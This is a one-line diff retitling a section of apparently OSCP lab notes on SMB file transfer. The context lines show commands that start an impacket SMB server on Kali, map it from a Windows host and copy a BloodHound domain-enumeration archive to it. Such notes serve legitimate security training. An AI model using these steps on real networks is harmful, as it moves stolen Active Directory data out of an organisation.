@@ -1,4 +1,4 @@
-##SMB Transfer
+##SMB File Transfer 
 kali>impacket-smbserver test . -smb2support  -username ashok -password reddy </br>
 WIN>net use m: \\192.168.45.242\home\kali\Desktop\HTB\OSCP\AD\beyond /user:kourosh kourosh </br>
 WIN>copy 20240715135750_BloodHound.zip m:\ </br>
